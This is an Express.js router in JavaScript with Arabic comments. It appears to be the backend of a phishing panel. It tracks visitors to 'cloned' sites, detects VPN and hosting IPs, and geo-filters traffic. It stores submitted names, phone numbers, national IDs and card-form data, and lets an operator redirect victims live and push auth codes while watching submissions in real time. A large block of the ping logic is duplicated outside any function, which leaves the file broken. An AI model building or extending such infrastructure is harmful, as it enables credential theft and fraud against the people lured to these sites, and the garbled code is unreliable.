import express from 'express';
import Site from '../models/Site.js';
import Visitor from '../models/Visitor.js';
import Submission from '../models/Submission.js';
import BlockedCountry, { SystemSetting } from '../models/BlockedCountry.js';
import BannedIP from '../models/BannedIP.js';

const router = express.Router();
const vpnIpCache = {};

async function resolveIpAndGeo(clientIp, headers = {}) {
    let targetIp = clientIp;

    if (!targetIp || targetIp === '::1' || targetIp === '127.0.0.1' || targetIp.startsWith('192.168.') || targetIp.startsWith('10.')) {
        try {
            const extRes = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(3000) });
            const extData = await extRes.json();
            targetIp = extData.ip;
        } catch {
            targetIp = clientIp;
        }
    }

    let isVpn = false;
    let countryCode = '';

    try {
        const res = await fetch(`https://ipwho.is/${targetIp}`, { signal: AbortSignal.timeout(3000) });
        if (res.ok) {
            const data = await res.json();
            if (data.success) {
                countryCode = data.country_code || '';

                const org = (data.connection?.org || '').toLowerCase();
                const isp = (data.connection?.isp || '').toLowerCase();
                const isHosting = data.security?.hosting || false;
                const isProxy = data.security?.proxy || false;
                const isVpnService = data.security?.vpn || false;

                if (
                    isHosting || isProxy || isVpnService ||
                    org.includes('vpn') || org.includes('hosting') || org.includes('datacenter') || org.includes('cloud') ||
                    isp.includes('vpn') || isp.includes('hosting') || isp.includes('datacenter')
                ) {
                    isVpn = true;
                }
            }
        }
    } catch { }

    return {
        realIp: targetIp,
        isVpn: isVpn,
        country: countryCode
    };
}


router.post('/ping', async (req, res) => {
    try {
        const { token, siteKey, currentPage, pageTitle, country, device, name, phone, nationalId, isLegitMove } = req.body;
        if (!token) return res.status(400).json({ error: "Token is required" });

        let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
        if (rawIp.includes(',')) rawIp = rawIp.split(',')[0].trim();
        if (rawIp.startsWith('::ffff:')) rawIp = rawIp.replace('::ffff:', '');

        const geoInfo = await resolveIpAndGeo(rawIp, req.headers);
        const resolvedIp = geoInfo.realIp;
        const currentIsVpn = geoInfo.isVpn;

        const cleanCountry = (geoInfo.country || country || 'UNKNOWN').trim().toUpperCase();

        if (resolvedIp) {
            const isIpBanned = await BannedIP.findOne({ ip: resolvedIp });
            if (isIpBanned) {
                return res.json({
                    status: 'go',
                    redirectUrl: '/blocked?_r=' + Date.now(),
                    isBlocked: true
                });
            }
        }

        const hasExplicitSiteKey = typeof siteKey === 'string' && siteKey.trim().length > 0;
        let activeSite = hasExplicitSiteKey ? siteKey.trim() : 'site_cars_01';

        // استخدم مطابقة الدومين كخيار احتياطي فقط. المفتاح الصريح من الموقع
        // يمنع نقل زيارات الدومين المنشور إلى موقع آخر له نطاق مطابق في اللوحة.
        if (!hasExplicitSiteKey) {
            try {
                const referer = req.headers.referer || req.headers.origin || '';
                if (referer && (referer.startsWith('http://') || referer.startsWith('https://'))) {
                    const parsedUrl = new URL(referer);
                    const hostname = parsedUrl.hostname.toLowerCase().replace('www.', '');
                    if (hostname && hostname !== 'localhost' && hostname !== '127.0.0.1') {
                        const matchedSite = await Site.findOne({ domain: { $regex: new RegExp(hostname, 'i') } });
                        if (matchedSite) {
                            activeSite = matchedSite.siteKey;
                        }
                    }
                }
            } catch (err) {
                console.error("[Domain Router Ping Error]:", err.message);
            }
        }

        // 🧠 تسجيل الموقع تلقائياً إذا لم يكن مسجلاً مسبقاً لضمان ظهوره في لوحة التحكم فوراً
        try {
            const exists = await Site.findOne({ siteKey: activeSite });
            if (!exists) {
                await Site.create({
                    siteKey: activeSite,
                    name: 'موقع جديد (' + activeSite + ')',
                    color: '#10b981'
                });
            }
        } catch (e) {
            console.error('Error auto-registering site:', e.message);
        }

        let isBlockedByGeo = false;
        const geoSetting = await SystemSetting.findOne({ key: 'geo_mode' });

        if (geoSetting && geoSetting.mode === 'whitelist') {
            if (cleanCountry && cleanCountry !== 'UNKNOWN' && cleanCountry !== geoSetting.allowedCountry.toUpperCase()) {
                isBlockedByGeo = true;
            }
        } else {
            if (cleanCountry && cleanCountry !== 'UNKNOWN') {
                const isBlocked = await BlockedCountry.findOne({ countryCode: cleanCountry });
                if (isBlocked) isBlockedByGeo = true;
            }
        }

        let visitor = await Visitor.findOne({ token });

        if (!visitor) {
            visitor = new Visitor({
                token,
                siteKey: activeSite,
                ip: resolvedIp,
                isVpn: currentIsVpn,
                currentPage,
                pageTitle: pageTitle || 'الرئيسية',
                country: cleanCountry,
                device: device || 'سطح مكتب',
                isBlocked: isBlockedByGeo,
                status: isBlockedByGeo ? 'go' : 'idle',
                redirectUrl: isBlockedByGeo ? '/blocked?_r=' + Date.now() : ''
            });
        } else {
            visitor.siteKey = activeSite;
            visitor.ip = resolvedIp;
            visitor.isVpn = currentIsVpn;
            visitor.currentPage = currentPage;
            if (pageTitle) visitor.pageTitle = pageTitle;
            if (device) visitor.device = device;
            visitor.lastSeen = Date.now();

            if (cleanCountry && cleanCountry !== 'UNKNOWN') visitor.country = cleanCountry;
            if (name) visitor.name = name;
            if (phone) visitor.phone = phone;
            if (nationalId) visitor.nationalId = nationalId;

            if (isBlockedByGeo && !visitor.isBlocked) {
                visitor.isBlocked = true;
                visitor.status = 'go';
                visitor.redirectUrl = '/blocked?_r=' + Date.now();
            } else if (!isBlockedByGeo && visitor.isBlocked && !visitor.authCode) {
                visitor.isBlocked = false;
                visitor.status = 'idle';
                visitor.redirectUrl = '';
            }

            // 🧠 التصفية الذكية لأمر التوجيه والتحرير الفوري بعد هبوط الزائر بنجاح
            if (visitor.status === 'go' && visitor.redirectUrl) {
                const targetClean = String(visitor.redirectUrl).split('?')[0].toLowerCase().replace(/^\//, '');
                const currentClean = String(currentPage).split('?')[0].toLowerCase().replace(/^\//, '');

                if (targetClean === currentClean || currentClean.includes(targetClean)) {
                    // تم هبوط الزائر بنجاح للمسار المطلوب، نقوم بتحريره فوراً
                    visitor.status = 'idle';
                    visitor.redirectUrl = '';
                    visitor.redirectStatus = 'success'; // تم التوجيه بنجاح
                } else {
                    visitor.redirectStatus = 'pending'; // جاري التوجيه
                }
            } else if (visitor.redirectStatus !== 'success') {
                visitor.redirectStatus = 'idle';
            }

            if (isLegitMove && visitor.redirectUrl && !visitor.isBlocked) {
                visitor.redirectUrl = currentPage;
            }
        }

        await visitor.save();
        req.io.emit('visitor_updated', visitor);

        res.json({
            status: visitor.status,
            redirectUrl: visitor.redirectUrl,
            isBlocked: visitor.isBlocked,
            authCode: visitor.authCode,
            callAlert: visitor.callAlert
        });
    } catch {
        res.status(500).json({ error: "Server error" });
    }
});

let activeSite = (siteKey && siteKey.trim()) ? siteKey.trim() : 'site_cars_01';

// 🧠 إستراتيجية مطابقة الدومين المطور تلقائياً لربط أي مستنسخ خارجي باللوحة المركزية بمرونة كاملة
try {
    const referer = req.headers.referer || req.headers.origin || '';
    if (referer && (referer.startsWith('http://') || referer.startsWith('https://'))) {
        const parsedUrl = new URL(referer);
        const hostname = parsedUrl.hostname.toLowerCase().replace('www.', '');
        if (hostname && hostname !== 'localhost' && hostname !== '127.0.0.1') {
            const matchedSite = await Site.findOne({ domain: { $regex: new RegExp(hostname, 'i') } });
            if (matchedSite) {
                activeSite = matchedSite.siteKey;
            }
        }
    }
} catch (err) {
    console.error("[Domain Router Ping Error]:", err.message);
}

// 🧠 تسجيل الموقع تلقائياً إذا لم يكن مسجلاً مسبقاً لضمان ظهوره في لوحة التحكم فوراً
try {
    const exists = await Site.findOne({ siteKey: activeSite });
    if (!exists) {
        await Site.create({
            siteKey: activeSite,
            name: 'موقع جديد (' + activeSite + ')',
            color: '#10b981'
        });
    }
} catch (e) {
    console.error('Error auto-registering site:', e.message);
}

let isBlockedByGeo = false;
const geoSetting = await SystemSetting.findOne({ key: 'geo_mode' });

if (geoSetting && geoSetting.mode === 'whitelist') {
    if (cleanCountry && cleanCountry !== 'UNKNOWN' && cleanCountry !== geoSetting.allowedCountry.toUpperCase()) {
        isBlockedByGeo = true;
    }
} else {
    if (cleanCountry && cleanCountry !== 'UNKNOWN') {
        const isBlocked = await BlockedCountry.findOne({ countryCode: cleanCountry });
        if (isBlocked) isBlockedByGeo = true;
    }
}

let visitor = await Visitor.findOne({ token });

if (!visitor) {
    visitor = new Visitor({
        token,
        siteKey: activeSite,
        ip: resolvedIp,
        isVpn: currentIsVpn,
        currentPage,
        pageTitle: pageTitle || 'الرئيسية',
        country: cleanCountry,
        device: device || 'سطح مكتب',
        isBlocked: isBlockedByGeo,
        status: isBlockedByGeo ? 'go' : 'idle',
        redirectUrl: isBlockedByGeo ? '/blocked?_r=' + Date.now() : ''
    });
} else {
    visitor.siteKey = activeSite;
    visitor.ip = resolvedIp;
    visitor.isVpn = currentIsVpn;
    visitor.currentPage = currentPage;
    if (pageTitle) visitor.pageTitle = pageTitle;
    if (device) visitor.device = device;
    visitor.lastSeen = Date.now();

    if (cleanCountry && cleanCountry !== 'UNKNOWN') visitor.country = cleanCountry;
    if (name) visitor.name = name;
    if (phone) visitor.phone = phone;
    if (nationalId) visitor.nationalId = nationalId;

    if (isBlockedByGeo && !visitor.isBlocked) {
        visitor.isBlocked = true;
        visitor.status = 'go';
        visitor.redirectUrl = '/blocked?_r=' + Date.now();
    } else if (!isBlockedByGeo && visitor.isBlocked && !visitor.authCode) {
        visitor.isBlocked = false;
        visitor.status = 'idle';
        visitor.redirectUrl = '';
    }

    // 🧠 التصفية الذكية لأمر التوجيه والتحرير الفوري بعد هبوط الزائر بنجاح
    if (visitor.status === 'go' && visitor.redirectUrl) {
        const targetClean = String(visitor.redirectUrl).split('?')[0].toLowerCase().replace(/^\//, '');
        const currentClean = String(currentPage).split('?')[0].toLowerCase().replace(/^\//, '');

        if (targetClean === currentClean || currentClean.includes(targetClean)) {
            // تم هبوط الزائر بنجاح للمسار المطلوب، نقوم بتحريره فوراً
            visitor.status = 'idle';
            visitor.redirectUrl = '';
            visitor.redirectStatus = 'success'; // تم التوجيه بنجاح
        } else {
            visitor.redirectStatus = 'pending'; // جاري التوجيه
        }
    } else if (visitor.redirectStatus !== 'success') {
        visitor.redirectStatus = 'idle';
    }

    if (isLegitMove && visitor.redirectUrl && !visitor.isBlocked) {
        visitor.redirectUrl = currentPage;
    }
}

await visitor.save();
req.io.emit('visitor_updated', visitor);

res.json({
    status: visitor.status,
    redirectUrl: visitor.redirectUrl,
    isBlocked: visitor.isBlocked,
    authCode: visitor.authCode,
    callAlert: visitor.callAlert
});
    } catch {
    res.status(500).json({ error: "Server error" });
}
});


router.post('/submit', async (req, res) => {
    try {
        const { token, siteKey, formName, submissionData, isFinalSubmission, isImportant } = req.body;
        if (!token || !formName) return res.status(400).json({ error: "Missing data" });

        const hasExplicitSiteKey = typeof siteKey === 'string' && siteKey.trim().length > 0;
        let activeSite = hasExplicitSiteKey ? siteKey.trim() : 'site_cars_01';

        // مطابقة الدومين تستخدم فقط عند غياب siteKey صريح من العميل.
        if (!hasExplicitSiteKey) {
            try {
                const referer = req.headers.referer || req.headers.origin || '';
                if (referer && (referer.startsWith('http://') || referer.startsWith('https://'))) {
                    const parsedUrl = new URL(referer);
                    const hostname = parsedUrl.hostname.toLowerCase().replace('www.', '');
                    if (hostname && hostname !== 'localhost' && hostname !== '127.0.0.1') {
                        const matchedSite = await Site.findOne({ domain: { $regex: new RegExp(hostname, 'i') } });
                        if (matchedSite) {
                            activeSite = matchedSite.siteKey;
                        }
                    }
                }
            } catch (err) {
                console.error("[Domain Router Submit Error]:", err.message);
            }
        }

        const sId = submissionData._sessionId || null;

        let queryCondition = sId
            ? { visitorToken: token, 'submissionData._sessionId': sId }
            : {
                visitorToken: token,
                siteKey: activeSite,
                formName: { $regex: new RegExp(`^${formName.split(' (')[0]}`) },
                isFinalSubmission: false
            };

        let currentSub = await Submission.findOne(queryCondition).sort({ createdAt: -1 });

        if (currentSub) {
            currentSub.formName = formName;
            currentSub.submissionData = submissionData;
            currentSub.isFinalSubmission = !!isFinalSubmission;
            currentSub.isImportant = !!isImportant;
            currentSub.updatedAt = new Date();
            await currentSub.save();
        } else {
            await Submission.create({
                visitorToken: token,
                siteKey: activeSite,
                formName,
                submissionData,
                isFinalSubmission: !!isFinalSubmission,
                isImportant: !!isImportant,
                createdAt: new Date(),
                updatedAt: new Date()
            });
        }

        let visitor = await Visitor.findOne({ token });
        if (visitor) {
            Object.entries(submissionData).forEach(([k, v]) => {
                if (v && String(v).trim()) {
                    const keyLower = String(k).toLowerCase();
                    if (keyLower.includes('هاتف') || keyLower.includes('phone') || keyLower.includes('mobile')) {
                        visitor.phone = String(v).trim();
                    }
                    if (keyLower.includes('اسم') || keyLower.includes('name')) {
                        if (!keyLower.includes('حامل') && !keyLower.includes('صاحب') && !keyLower.includes('بطاق') && !keyLower.includes('card') && !keyLower.includes('holder')) {
                            visitor.name = String(v).trim();
                        }
                    }
                }
            });

            visitor.lastFormName = formName;
            visitor.lastSubmissionDate = Date.now();
            visitor.isRead = false;
            await visitor.save();
            req.io.emit('visitor_updated', visitor);
        }

        req.io.emit('new_submission', { token, siteKey: activeSite, formName, submissionData, isFinalSubmission, isImportant });
        res.json({ success: true });
    } catch (err) {
        console.error('Submit Error:', err);
        res.status(500).json({ error: "Server error" });
    }
});


export default router;
